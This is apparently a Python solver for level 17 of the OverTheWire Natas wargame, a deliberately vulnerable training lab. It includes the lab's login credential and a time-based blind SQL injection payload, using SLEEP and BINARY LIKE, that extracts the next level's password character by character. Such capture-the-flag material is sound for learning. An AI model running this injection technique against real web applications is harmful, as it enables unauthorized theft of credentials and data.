import requests
import re
import string
from time import *

usn = 'natas17'
url = 'http://%s.natas.labs.overthewire.org/' % usn
password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
login = (usn, password)

alpha_num = string.ascii_letters + string.digits
confirmed_pass = list()
session = requests.Session()

#sessionGet = session.get(url, auth=login )
#pageContent = sessionGet.text 

#print pageContent


#########################################

while (len(confirmed_pass) < 32):
  for ch in alpha_num:
    start_time = time()
    #print("Attempting: ", "".join(confirmedPass) + ch)
    session_post = session.post(url, data = {"username" : 'natas18" AND BINARY password LIKE "' + "".join(confirmed_pass) + ch +'%" AND SLEEP(2) # '}, auth = login) ## BINARY LIKE for case sensitivity
    page_content = session_post.text
    end_time = time()
    duration = end_time - start_time
   

    if(duration > 2):
      confirmed_pass.append(ch)
      print("Password = " + "".join(confirmed_pass))
      break;
    